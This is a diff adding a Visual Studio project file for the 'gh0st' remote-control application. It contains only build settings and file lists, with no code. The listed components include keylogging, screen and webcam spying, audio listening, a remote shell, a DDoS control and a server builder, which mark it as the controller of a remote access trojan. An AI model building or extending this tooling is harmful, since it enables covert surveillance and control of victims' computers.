@@ -1,0 +1,295 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Unicode|Win32">
+      <Configuration>Unicode</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <ProjectGuid>{D6E6F343-AC1D-4497-B00F-D345642C1870}</ProjectGuid>
+    <RootNamespace>gh0st</RootNamespace>
+    <Keyword>MFCProj</Keyword>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v120</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+    <UseOfMfc>Static</UseOfMfc>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v120</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+    <UseOfMfc>Static</UseOfMfc>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Unicode|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v120</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+    <UseOfMfc>Static</UseOfMfc>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Unicode|Win32'" Label="PropertySheets">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <LinkIncremental>true</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <LinkIncremental>false</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Unicode|Win32'">
+    <LinkIncremental>false</LinkIncremental>
+    <OutDir>..\</OutDir>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <PrecompiledHeader>Create</PrecompiledHeader>
+      <WarningLevel>Level3</WarningLevel>
+      <Optimization>Disabled</Optimization>
+      <PreprocessorDefinitions>WIN32;_WINDOWS;_DEBUG;_CRT_SECURE_NO_WARNINGS;_WINSOCK_DEPRECATED_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <SDLCheck>true</SDLCheck>
+      <AdditionalIncludeDirectories>..\\common</AdditionalIncludeDirectories>
+    </ClCompile>
+    <Link>
+      <SubSystem>Windows</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalDependencies>..\common\zlib\zlib.lib</AdditionalDependencies>
+    </Link>
+    <Midl>
+      <MkTypLibCompatible>false</MkTypLibCompatible>
+      <ValidateAllParameters>true</ValidateAllParameters>
+      <PreprocessorDefinitions>_DEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </Midl>
+    <ResourceCompile>
+      <Culture>0x0804</Culture>
+      <PreprocessorDefinitions>_DEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <AdditionalIncludeDirectories>$(IntDir);%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+    </ResourceCompile>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <Optimization>MaxSpeed</Optimization>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;WIN32;_WINDOWS;NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <SDLCheck>true</SDLCheck>
+      <AdditionalIncludeDirectories>..\\common;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <FavorSizeOrSpeed>Speed</FavorSizeOrSpeed>
+      <WholeProgramOptimization>true</WholeProgramOptimization>
+      <PrecompiledHeader>Use</PrecompiledHeader>
+    </ClCompile>
+    <Link>
+      <SubSystem>Windows</SubSystem>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <SetChecksum>true</SetChecksum>
+      <AdditionalDependencies>..\common\zlib\zlib.lib</AdditionalDependencies>
+    </Link>
+    <Midl>
+      <MkTypLibCompatible>false</MkTypLibCompatible>
+      <ValidateAllParameters>true</ValidateAllParameters>
+      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </Midl>
+    <ResourceCompile>
+      <Culture>0x0804</Culture>
+      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <AdditionalIncludeDirectories>$(IntDir);%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+    </ResourceCompile>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Unicode|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <Optimization>MaxSpeed</Optimization>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;WIN32;_WINDOWS;UNICODE;_UNICODE;NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <SDLCheck>true</SDLCheck>
+      <AdditionalIncludeDirectories>..\\common;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <FavorSizeOrSpeed>Speed</FavorSizeOrSpeed>
+      <WholeProgramOptimization>false</WholeProgramOptimization>
+      <PrecompiledHeader>Use</PrecompiledHeader>
+    </ClCompile>
+    <Link>
+      <SubSystem>Windows</SubSystem>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <SetChecksum>true</SetChecksum>
+      <AdditionalDependencies>..\\common\\zlib\\zlib.lib</AdditionalDependencies>
+      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
+    </Link>
+    <Midl>
+      <MkTypLibCompatible>false</MkTypLibCompatible>
+      <ValidateAllParameters>true</ValidateAllParameters>
+      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </Midl>
+    <ResourceCompile>
+      <Culture>0x0804</Culture>
+      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <AdditionalIncludeDirectories>$(IntDir);%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+    </ResourceCompile>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <Text Include="ReadMe.txt" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="..\common\Audio.h" />
+    <ClInclude Include="AboutDlg.h" />
+    <ClInclude Include="AudioDlg.h" />
+    <ClInclude Include="BmpToAvi.h" />
+    <ClInclude Include="BuildServerDlg.h" />
+    <ClInclude Include="CustomTabCtrl.h" />
+    <ClInclude Include="encode.h" />
+    <ClInclude Include="FileTransferModeDlg.h" />
+    <ClInclude Include="gh0st.h" />
+    <ClInclude Include="gh0stDoc.h" />
+    <ClInclude Include="gh0stView.h" />
+    <ClInclude Include="include\Buffer.h" />
+    <ClInclude Include="include\CpuUsage.h" />
+    <ClInclude Include="include\IOCPServer.h" />
+    <ClInclude Include="include\Mapper.h" />
+    <ClInclude Include="IniFile.h" />
+    <ClInclude Include="InputDlg.h" />
+    <ClInclude Include="KeyBoardDlg.h" />
+    <ClInclude Include="LogView.h" />
+    <ClInclude Include="MainFrm.h" />
+    <ClInclude Include="MoreChoose.h" />
+    <ClInclude Include="MyFileManagerDlg.h" />
+    <ClInclude Include="MyScreenSpyDlg.h" />
+    <ClInclude Include="ProxyDlg.h" />
+    <ClInclude Include="resource.h" />
+    <ClInclude Include="Schemadef.h" />
+    <ClInclude Include="SettingDlg.h" />
+    <ClInclude Include="SEU_QQwry.h" />
+    <ClInclude Include="ShellDlg.h" />
+    <ClInclude Include="ShowNum.h" />
+    <ClInclude Include="skin.h" />
+    <ClInclude Include="SkinH.h" />
+    <ClInclude Include="Splash.h" />
+    <ClInclude Include="StdAfx.h" />
+    <ClInclude Include="SystemDlg.h" />
+    <ClInclude Include="TabSDIFrameWnd.h" />
+    <ClInclude Include="targetver.h" />
+    <ClInclude Include="ThemeUtil.h" />
+    <ClInclude Include="TrayIcon.h" />
+    <ClInclude Include="TrueColorToolBar.h" />
+    <ClInclude Include="UPDATEIP.h" />
+    <ClInclude Include="UpipDlg.h" />
+    <ClInclude Include="WebCamDlg.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="..\common\Audio.cpp" />
+    <ClCompile Include="..\common\minilzo.cpp" />
+    <ClCompile Include="..\common\RegEditEx.cpp" />
+    <ClCompile Include="AboutDlg.cpp" />
+    <ClCompile Include="AudioDlg.cpp" />
+    <ClCompile Include="BmpToAvi.cpp" />
+    <ClCompile Include="BuildServerDlg.cpp" />
+    <ClCompile Include="CustomTabCtrl.cpp" />
+    <ClCompile Include="FileTransferModeDlg.cpp" />
+    <ClCompile Include="gh0st.cpp" />
+    <ClCompile Include="gh0stDoc.cpp" />
+    <ClCompile Include="gh0stView.cpp" />
+    <ClCompile Include="include\Buffer.cpp" />
+    <ClCompile Include="include\CpuUsage.cpp" />
+    <ClCompile Include="include\IOCPServer.cpp" />
+    <ClCompile Include="IniFile.cpp" />
+    <ClCompile Include="InputDlg.cpp" />
+    <ClCompile Include="KeyBoardDlg.cpp" />
+    <ClCompile Include="LogView.cpp" />
+    <ClCompile Include="MainFrm.cpp" />
+    <ClCompile Include="MyFileManagerDlg.cpp" />
+    <ClCompile Include="MyScreenSpyDlg.cpp" />
+    <ClCompile Include="ProxyDlg.cpp" />
+    <ClCompile Include="SettingDlg.cpp" />
+    <ClCompile Include="SEU_QQwry.cpp" />
+    <ClCompile Include="ShellDlg.cpp" />
+    <ClCompile Include="Splash.cpp" />
+    <ClCompile Include="StdAfx.cpp">
+      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Unicode|Win32'">Create</PrecompiledHeader>
+    </ClCompile>
+    <ClCompile Include="SystemDlg.cpp" />
+    <ClCompile Include="TabSDIFrameWnd.cpp" />
+    <ClCompile Include="ThemeUtil.cpp" />
+    <ClCompile Include="TrayIcon.cpp" />
+    <ClCompile Include="TrueColorToolBar.cpp" />
+    <ClCompile Include="UpipDlg.cpp" />
+    <ClCompile Include="WebCamDlg.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="gh0st.rc" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="res\aero.she" />
+    <None Include="res\gh0st.rc2" />
+  </ItemGroup>
+  <ItemGroup>
+    <Image Include="res\about.ico" />
+    <Image Include="res\audio.ico" />
+    <Image Include="res\Bitmap_4.bmp" />
+    <Image Include="res\Bitmap_5.bmp" />
+    <Image Include="res\cmdshell.ico" />
+    <Image Include="res\ddos.ico" />
+    <Image Include="res\event.ico" />
+    <Image Include="res\EventError.ico" />
+    <Image Include="res\exit.ico" />
+    <Image Include="res\folder.ico" />
+    <Image Include="res\hgz.ico" />
+    <Image Include="res\keyboard.ico" />
+    <Image Include="res\manage.ico" />
+    <Image Include="res\screen.ico" />
+    <Image Include="res\server.ico" />
+    <Image Include="res\setting.ico" />
+    <Image Include="res\system.ico" />
+    <Image Include="res\toolbar1.bmp" />
+    <Image Include="res\toolbar2.bmp" />
+    <Image Include="res\ToolBarDoc.ico" />
+    <Image Include="res\upip.ico" />
+    <Image Include="res\webcam.ico" />
+    <Image Include="res\上线主机.bmp" />
+    <Image Include="res\关于.bmp" />
+    <Image Include="res\参数设置.bmp" />
+    <Image Include="res\屏幕监控.bmp" />
+    <Image Include="res\文件管理.bmp" />
+    <Image Include="res\系统管理.bmp" />
+    <Image Include="res\视频监控.bmp" />
+    <Image Include="res\语音监听.bmp" />
+    <Image Include="res\远程终端.bmp" />
+    <Image Include="res\退出程序.bmp" />
+    <Image Include="res\配置生成.bmp" />
+    <Image Include="res\键盘监控.bmp" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+  <ProjectExtensions>
+    <VisualStudio>
+      <UserProperties RESOURCE_FILE="gh0st.rc" />
+    </VisualStudio>
+  </ProjectExtensions>
+</Project>
